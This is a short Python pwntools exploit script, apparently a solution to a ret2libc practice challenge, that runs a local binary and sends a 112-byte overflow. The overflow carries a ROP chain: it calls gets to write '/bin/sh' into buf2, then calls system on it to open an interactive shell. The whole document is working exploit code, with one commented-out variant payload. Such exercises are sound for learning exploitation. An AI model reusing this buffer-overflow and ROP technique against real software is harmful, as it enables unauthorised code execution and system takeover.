from pwn import *

sh = process(['/home/uniquer/code/pwn/binary/ret2libc2'])

elf = ELF('/home/uniquer/code/pwn/binary/ret2libc2')
system_plt = elf.plt["system"]
gets_plt = elf.plt["gets"]
buf2 = elf.symbols["buf2"]

# gets_plt = 0x08048460
# system_plt = 0x08048490
pop_ebx = 0x0804843d
# buf2 = 0x804a080

payload = flat(
    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, b'bbbb', buf2])

# payload =  flat(
#     [b'a' * 112, gets_plt, system_plt, buf2, buf2])

sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()